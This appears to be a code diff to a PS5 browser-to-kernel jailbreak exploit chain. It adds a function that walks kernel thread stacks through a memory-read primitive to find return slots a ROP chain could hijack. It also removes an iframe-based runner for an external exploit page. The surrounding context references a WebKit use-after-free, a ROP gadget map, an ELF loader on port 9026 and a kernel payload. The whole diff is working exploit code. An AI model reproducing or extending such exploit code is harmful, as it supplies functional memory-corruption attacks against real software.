@@ -861,6 +861,95 @@ async function settleMemoryBeforeROP(ms = 800) {
         + `(explicit gc: ${gced ? "yes" : "not exposed"})`, "log-info");
 }
 
+// Read-only walk of the kernel thread list, logged as a diagnostic.
+//
+// Why this exists: the ROP chain needs a thread it can wake and hijack. It
+// currently requires a Worker, identified by two fingerprints -- a 0x80000
+// stack and a saved PC equal to libkernel's worker_wait_return. That Worker
+// is the most expensive allocation in the whole run, and creating it AFTER
+// the exploit has churned through its ~110 MB fails with "not enough system
+// memory space".
+//
+// This survey answers, with measurements instead of guesses, whether a Worker
+// is actually required. For every thread it records the stack size, and for
+// worker-sized stacks it looks in the top page for (a) the exact
+// worker_wait_return fingerprint and (b) a *generic* return slot: a qword that
+// points into libkernel text followed by a qword that looks like a stack
+// pointer. A generic slot means some other already-running thread could be
+// woken and hijacked instead, which needs no new allocation at all.
+//
+// Costs ~256 reads per worker-sized thread and is wrapped in try/catch: it
+// must never be able to fail the run.
+function surveyThreads(p, libKernelBase, offsets, threadLimit = 48) {
+    try {
+        const num = (v) => (v.hi >>> 0) * 0x100000000 + (v.low >>> 0);
+        const kBase = num(libKernelBase);
+        const KERNEL_TEXT = 0x800000;
+        const isCode = (v) => v >= kBase && v < kBase + KERNEL_TEXT && v % 4 === 0;
+        const isStackPtr = (v) => v > 0x100000000 && v < 0x800000000000 && v % 8 === 0;
+
+        let expected = -1;
+        try { expected = num(libKernelBase.add32(offsets.lk_worker_wait_return)); }
+        catch (e) { log(`survey: no worker_wait_return offset (${e.message})`, "log-warn"); }
+
+        const sizes = new Map();
+        let workerStacks = 0, exactHits = 0, genericOnly = 0;
+        const notes = [];
+
+        let thread = p.read8(libKernelBase.add32(offsets.lk_thread_list));
+        let idx = 0;
+        while ((thread.low !== 0 || thread.hi !== 0) && idx < threadLimit) {
+            let stack = null, size = 0;
+            try {
+                stack = p.read8(thread.add32(0xA8));
+                const sz = p.read8(thread.add32(0xB0));
+                size = num(sz);
+                sizes.set(size, (sizes.get(size) || 0) + 1);
+            } catch (e) { /* unreadable thread */ }
+
+            if (stack && size === 0x80000) {
+                workerStacks++;
+                let exact = -1, generic = -1;
+                // The saved return address lives near the top of the stack;
+                // this is the same window the hijack already searches.
+                for (let off = 0x7F000; off < 0x80000 && off + 16 <= 0x80000; off += 8) {
+                    let pc, sp;
+                    try {
+                        pc = num(p.read8(stack.add32(off)));
+                        sp = num(p.read8(stack.add32(off + 8)));
+                    } catch (e) { break; }
+                    if (exact < 0 && expected >= 0 && pc === expected) exact = off;
+                    if (generic < 0 && isCode(pc) && isStackPtr(sp)) generic = off;
+                }
+                if (exact >= 0) { exactHits++; notes.push(`t${idx}:exact@0x${exact.toString(16)}`); }
+                else if (generic >= 0) { genericOnly++; notes.push(`t${idx}:generic@0x${generic.toString(16)}`); }
+                else notes.push(`t${idx}:no-slot`);
+            }
+
+            try { thread = p.read8(thread.add32(0x38)); }
+            catch (e) { break; }
+            idx++;
+        }
+
+        const sizeList = Array.from(sizes.entries())
+            .sort((a, b) => b[1] - a[1])
+            .map(([s, n]) => `0x${s.toString(16)}x${n}`).join(" ");
+        log(`survey: ${idx} threads, stack sizes [${sizeList}]`, "log-info");
+        log(`survey: 0x80000 stacks=${workerStacks} exact=${exactHits} generic-only=${genericOnly}`
+            + (notes.length ? ` (${notes.slice(0, 8).join(" ")})` : ""), "log-info");
+        if (exactHits === 0) {
+            log("survey: NO thread carries the worker_wait_return fingerprint -- "
+                + "the Worker is not primed, or a different wake primitive is needed", "log-warn");
+        }
+        if (genericOnly > 0) {
+            log("survey: at least one non-Worker thread has a hijackable return "
+                + "slot -- a Worker-free hijack looks possible", "log-ok");
+        }
+    } catch (err) {
+        log(`survey failed (non-fatal): ${err.message}`, "log-warn");
+    }
+}
+
 async function initROP() {
     let p = exploitState.p || window.p || globalThis.p;
     if (!p) throw new Error("No primitive");
@@ -963,6 +1052,8 @@ async function initROP() {
         throw new Error(`Offsets do not match firmware ${fwStr}; aborting before ROP (avoids WebKit OOM crash).`);
     }
     log(`Resolved bases pass the offset plausibility check (wk=0x${libSceNKWebKitBase.toString()}, lk=0x${libKernelBase.toString()}, lc=0x${libSceLibcInternalBase.toString()})`, "log-ok");
+
+    surveyThreads(p, libKernelBase, offsets);
 
     let gadgets = {};
     for (let g in offsets.wk_gadgetmap) gadgets[g] = libSceNKWebKitBase.add32(offsets.wk_gadgetmap[g]);
@@ -1316,80 +1407,6 @@ async function loadElfldrViaROP({ p, chain, syscalls, nogc, libcMemcpy }) {
     throw new Error("elfldr did not bind on port 9026");
 }
 
-// ============================================================
-// RUNNER SELECTION
-// The stages above re-implement the whole chain inside this page. That works
-// for the primitive, but the page is a full UI and the ROP stage cannot spawn
-// its worker thread: the PS5 WebProcess is already carrying the exploit's
-// ~110 MB of graphs and answers "not enough system memory space".
-//
-// The validated slopkit run does the same work in a bare page, which is why
-// it fits. So by default we hand the whole job to slopkit-main/slopkit/poops.html
-// in an iframe and mirror its status here. Add "?inline=1" to force the
-// in-page path (useful for debugging the individual stages).
-// ============================================================
-const USE_VALIDATED_RUNNER = !/[?&]inline=1\b/.test(location.search);
-
-function runValidatedSlopkit() {
-    // Same URL slopkit-main/index.html links to, with attempts=8.
-    const url = "slopkit-main/slopkit/poops.html?go=1&auto=1&production=1"
-        + "&trigger=netcontrol&attempts=8"
-        + "&only=ps0_preflight,ps1_prepare,ps3_stage0,ps4_validate,ps5_stage1,"
-        + "ps6_stage2,ps8_stage3,ps9_stage4,ps10_stage5"
-        + "&log=debug&payload=1&v=ktech2";
-
-    return new Promise((resolve) => {
-        const frame = document.createElement("iframe");
-        frame.id = "slopkit-runner";
-        frame.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;"
-            + "border:none;z-index:9999;background:#0c0c0f;";
-        frame.src = url;
-        document.body.appendChild(frame);
-        log("validated runner: handed the chain to slopkit poops.html", "log-info");
-
-        let done = false;
-        let timer = null, deadline = null;
-        const finish = (ok, error) => {
-            if (done) return;
-            done = true;
-            if (timer) clearInterval(timer);
-            if (deadline) clearTimeout(deadline);
-            // On success the ROP thread and elfldr live INSIDE the frame, so it
-            // must stay alive. Only tear it down on failure.
-            if (!ok) { try { frame.remove(); } catch (e) { } }
-            resolve({ success: ok, error: error || null });
-        };
-
-        let lastMark = "";
-        timer = setInterval(() => {
-            let fw = null;
-            try { fw = frame.contentWindow; } catch (e) { return; }
-            if (!fw) return;
-            try {
-                const marks = fw.jb && fw.jb.marks;
-                if (Array.isArray(marks) && marks.length) {
-                    const m = marks[marks.length - 1];
-                    const line = m.tag + ": " + m.detail;
-                    if (line !== lastMark) { lastMark = line; log(`slopkit: ${line}`, "log-info"); }
-                }
-            } catch (e) { }
-            try {
-                const doc = frame.contentDocument;
-                const cat = doc && doc.getElementById("cat");
-                const st = doc && doc.getElementById("status");
-                if (cat && cat.classList.contains("ok")) {
-                    log("slopkit runner reported success", "log-ok");
-                    finish(true);
-                } else if (cat && cat.classList.contains("bad")) {
-                    finish(false, (st && st.textContent) || "slopkit reported failure");
-                }
-            } catch (e) { }
-        }, 500);
-
-        deadline = setTimeout(() => finish(false, "slopkit runner timeout (300s)"), 300000);
-    });
-}
-
 async function loadKstuffViaElfldr() {
     log("Sending kstuff.elf to elfldr (port 9026)...", "log-info");
     const res = await fetch("payloads/kstuff.elf");
@@ -1429,17 +1446,6 @@ async function runFullExploitChain() {
     progress.textContent = "";
 
     try {
-        if (USE_VALIDATED_RUNNER) {
-            // Hand the entire chain (primitive -> ROP -> elfldr -> kstuff) to
-            // the validated slopkit page running in its own light context.
-            msg.textContent = "Running the validated slopkit chain...";
-            const r = await runValidatedSlopkit();
-            if (!r.success) throw new Error(r.error || "validated slopkit run failed");
-            log("validated slopkit chain finished", "log-ok");
-            exploitState.webkitExploited = true;
-            exploitState.elfldrLoaded = true;
-            exploitState.kernelExploited = true;
-        } else {
         await runWebKitUAF((detail) => { progress.textContent = detail; });
         exploitState.webkitExploited = true;
 
@@ -1472,7 +1478,6 @@ async function runFullExploitChain() {
         updateStageBadge("verify");
         msg.textContent = "Verifying jailbreak...";
         await verifyJailbreak();
-        }   // end of the ?inline=1 path
 
         exploitState.jailbroken = true;
         exploitState.stage = "complete";
